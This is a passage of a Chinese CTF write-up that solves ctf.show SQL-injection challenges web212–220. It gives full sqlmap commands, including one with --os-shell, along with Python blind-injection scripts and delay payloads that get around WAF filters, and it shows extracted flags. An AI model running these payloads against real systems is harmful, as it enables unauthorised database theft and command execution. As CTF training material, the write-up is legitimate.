<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://1505ab2c-fe52-41e3-9b1f-d94ba6a346e6.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">-D</span> ctfshow_web <span class="literal">--tables</span> <span class="literal">--dump</span> <span class="literal">--batch</span> <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=hu1t6tuqcfu7vmme69i18bojq9;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://1505ab2c-fe52-41e3-9b1f-d94ba6a346e6.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=spaceto09,ctfshowweb210</span><br></pre></td></tr></table></figure>

<h2 id="web213"><a href="#web213" class="headerlink" title="web213"></a>web213</h2><p>åœ¨æœ€ååŠ ä¸Šå‚æ•°<code>--os-shell</code>å³å¯</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">python sqlmap.py <span class="literal">-u</span> <span class="string">&quot;http://cda45164-89a8-403c-bbb8-ff48beb3c89b.challenge.ctf.show/api/index.php&quot;</span> <span class="literal">--method</span>=PUT <span class="literal">--data</span> <span class="string">&quot;id=1&quot;</span> <span class="literal">--user-agent</span>=sqlmap <span class="literal">--referer</span>=ctf.show <span class="literal">--headers</span>=<span class="string">&quot;Content-Type: text/plain&quot;</span> <span class="literal">--cookie</span>=<span class="string">&quot;PHPSESSID=6rop5p56jt75lmc41mkvdi0rt1;&quot;</span> <span class="literal">--safe-url</span>=<span class="string">&quot;http://cda45164-89a8-403c-bbb8-ff48beb3c89b.challenge.ctf.show/api/getToken.php&quot;</span> <span class="literal">--safe-freq</span>=<span class="number">1</span> <span class="literal">--tamper</span>=spaceto09,ctfshowweb210 <span class="literal">--batch</span> <span class="literal">--os-shell</span></span><br></pre></td></tr></table></figure>

<p>æ‰§è¡Œ<code>cat /ctfshow_flag</code>å³å¯</p>
<h2 id="web214"><a href="#web214" class="headerlink" title="web214"></a>web214</h2><p>æ—¶é—´ç›²æ³¨ï¼Œè®¿é—®é¦–é¡µæŠ“åŒ…å¯ä»¥å‘ç°æ³¨å…¥ç‚¹ï¼Œä¿®æ”¹<code>debug=1</code>å¯ä»¥çœ‹åˆ°<code>sql</code>è¯­å¥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = 127.0.0.1</span><br></pre></td></tr></table></figure>

<p>ç¼–å†™è„šæœ¬å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://074260b2-9b7b-4c5f-a1b9-74b294124195.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagx,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flaga,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;0c212089-3b00-4cd9-b24f-2c2ab51a9674&#125;</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;if((ascii(substr((select group_concat(flaga)from ctfshow_flagx),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),sleep(3),1)&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure>

<h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>å¤šäº†å¼•å·åŒ…è£¹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = &#x27;127.0.0.1&#x27;;</span><br></pre></td></tr></table></figure>

<p>è¿˜æ˜¯äºŒåˆ†æ—¶é—´ç›²æ³¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7dedec9c-cc09-44c5-b69a-f2c187da25e4.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;&#x27;||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxc,ctfshow_info </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;&#x27;||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaa,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;&#x27;||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;ddf21244-bda1-4631-8272-8e5fc47275a5&#125;</span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;&#x27;||if((ascii(substr((select group_concat(flagaa)from ctfshow_flagxc),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>å¢åŠ äº†<code>base64</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = from_base64(127.0.0.1);</span><br></pre></td></tr></table></figure>

<p>ç”¨æ‹¬å·é—­åˆå°±å¥½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5e3ed249-6c2f-4151-9eb4-c2d122870908.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxcc,ctfshow_info </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaac,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),sleep(3),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;3c215bb4-3aab-4149-96fb-ea6c2bbdf49d&#125; </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaac)from ctfshow_flagxcc),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),sleep(3),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure>

<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>è¿‡æ»¤äº†<code>sleep</code>ï¼Œå¹¶ä¸”éœ€è¦æ‹¬å·é—­åˆ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select id from ctfshow_info where ip = (1);</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨<code>benchmark</code>ï¼Œè¿ç®—æ¬¡æ•°å’Œ<code>timeout</code>ç­‰è¦æ ¹æ®å…·ä½“æƒ…å†µè°ƒæ•´ï¼ˆå¤ªæŠ˜ç£¨ğŸ˜¥ï¼Œæœ‰å¥½æ–¹æ³•ä¹Ÿå¸Œæœ›æ•™æ•™æˆ‘ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://59ec0bcc-2aa8-44eb-978b-20e0354ff0a2.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),benchmark(50000000,&#x27;evo1&#x27;),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxccb,ctfshow_info </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),benchmark(150000000,&#x27;evo1&#x27;),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaabc,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),benchmark(150000000,&#x27;evo1&#x27;),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;c8faf32a-fe53-41f0-a7df-560a0971f034&#125; </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaabc)from ctfshow_flagxccb),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),benchmark(150000000,&#x27;evo1&#x27;),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.7</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">2</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿæœ‰ä¸€äº›å…¶ä»–æ–¹æ³•<a target="_blank" rel="noopener" href="https://www.jb51.net/article/212587.htm">MySQLæ—¶é—´ç›²æ³¨çš„äº”ç§å»¶æ—¶æ–¹æ³•å®ç°</a></p>
<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p><code>benchmark</code>ä¹Ÿè¢«ç¦ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨ç¬›å¡å°”ç§¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip=0)||if((ascii(substr((select database()),1,1))&lt;100),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&amp;debug=1</span><br></pre></td></tr></table></figure>

<p>ç¼–å†™è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://eba89dba-b139-4154-b319-62a66a78c3eb.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxc,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaac,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;5456333f-bac9-48eb-b262-4e1eaf38fe0a&#125;  </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaac)from ctfshow_flagxc),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå¯ä»¥åˆ©ç”¨<code>rlike</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">concat(rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;),rpad(1,999999,&#x27;a&#x27;)) RLIKE &#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b&#x27;</span><br></pre></td></tr></table></figure>

<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>ç¦ç”¨äº†<code>rlike</code>ï¼Œä½¿ç”¨ç¬›å¡å°”ç§¯å³å¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c27f8fcf-6c42-426b-af89-449cbd4f7769.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    l = <span class="number">32</span></span><br><span class="line">    r = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> l &lt; r:</span><br><span class="line">        mid = (l+r)&gt;&gt;<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span>(mid==l):</span><br><span class="line">            flag += <span class="built_in">chr</span>(mid)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web </span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxca,ctfshow_info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å id,flagaabc,info</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((ascii(substr((select group_concat(column_name)from information_schema.columns where table_name=&#x27;ctfshow_flagxca&#x27;),&#123;i&#125;,1))&lt;&#123;mid&#125;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># ctfshow&#123;3adf6005-ec81-4a42-8e06-7adbb42c6c11&#125;  </span></span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:<span class="string">f&quot;0)||if((ascii(substr((select group_concat(flagaabc)from ctfshow_flagxca),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;</span>,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="string">&quot;0&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">            l = mid</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            r = mid</span><br></pre></td></tr></table></figure>

<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>ç¦ç”¨äº†ä¸€äº›å­—ç¬¦ï¼ŒåŸæ¥çš„<code>substr</code>ç”¨ä¸äº†äº†</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ç›´æ¥ç”¨<code>left</code>ï¼Œæ³¨æ„<code>concat</code>è¢«ç¦ç”¨äº†ï¼Œå€ŸåŠ©ä¸‹<code>limit</code>å°±å¥½</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line">letters = string.ascii_letters + string.digits + <span class="string">&#x27;-&#125;&#123;_&#x27;</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35be7a51-5a9f-4590-9d07-9f14166e0779.challenge.ctf.show/api/&quot;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letters:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="comment"># æ•°æ®åº“ ctfshow_web</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((left((select database()),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># è¡¨å ctfshow_flagxcac</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;i&#125;)=&#x27;&#123;flag+j&#125;&#x27;),(SELECT count(*) FROM(( SELECT table_name FROM information_schema.COLUMNS ) a,( SELECT table_name FROM information_schema.COLUMNS ) b,( SELECT table_name FROM information_schema.COLUMNS limit 1,3 ) c) LIMIT 1),1)#&quot;,</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment"># åˆ—å flagaabcc</span></span><br><span class="line">            <span class="comment"># &quot;ip&quot;:f&quot;0)||if((left((select column_name from information_schema.columns where 